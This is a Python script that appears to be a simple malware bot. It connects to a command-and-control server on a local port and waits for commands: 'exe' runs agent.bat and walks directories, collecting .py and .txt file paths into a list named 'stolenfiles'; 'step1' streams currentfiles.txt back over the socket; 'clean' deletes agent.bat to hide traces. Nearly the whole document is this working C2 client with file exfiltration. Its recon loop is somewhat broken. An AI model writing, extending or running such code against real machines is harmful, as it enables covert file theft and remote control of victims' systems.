import socket,os,time,re
pys = ['stolenfiles']
txts = []
secrets = []
filebytes = []
def mal1():
    os.system('agent.bat')

def mal2():
    print('system recon')

    for root, dirs, files in os.walk(".", topdown = False):
        for name in files:
      
            for i in files:
                tt = re.findall("\w*[\.]py|\w*[\.]txt", str(i) )
                if len(tt) > 0:
                    yu = os.path.join(root, name)
                    pys.append(yu)
                
        for name in dirs:
            for i in files:
                tt = re.findall("\w*[\.]txt", str(i) )
               
                if len(tt) > 0: txts.append(str(tt[0]))
    


HOST = '127.0.0.1'
PORT = 2048
BUFFER_SIZE = 4096 # send 4096 bytes each time step

a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
a.connect((HOST, PORT))
a.send('alive'.encode())
print('alive sent to c2')
while True:
    data = a.recv(1024)
    if data.decode() == 'exe':
        mal1()
        mal2()
        print('executing malware')
        time.sleep(1)
        a.send('load'.encode())
    elif data.decode() == 'step1':
        time.sleep(2)
        filename = "currentfiles.txt"
        # get the file size
        filesize = os.path.getsize(filename)

        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                filebytes.append(bytes_read)
                if not bytes_read:
                    # file transmitting is done
                    print('done!!')
                    break
                
                a.sendall(str(bytes_read).encode())
        print('step 1 complete')
        time.sleep(1)
        
    elif data.decode() == 'clean':
        os.system('copy agent.bat agent.txt && del agent.bat')
        time.sleep(1)
        a.send('bot waiting'.encode())
    elif data.decode() == 'sleep':
        print('sleeping')
        time.sleep(15)
        a.send('bot waiting'.encode())
    else:
        print(data.decode())
        msg = 'standard' 
        time.sleep(1)
        a.send(msg.encode())
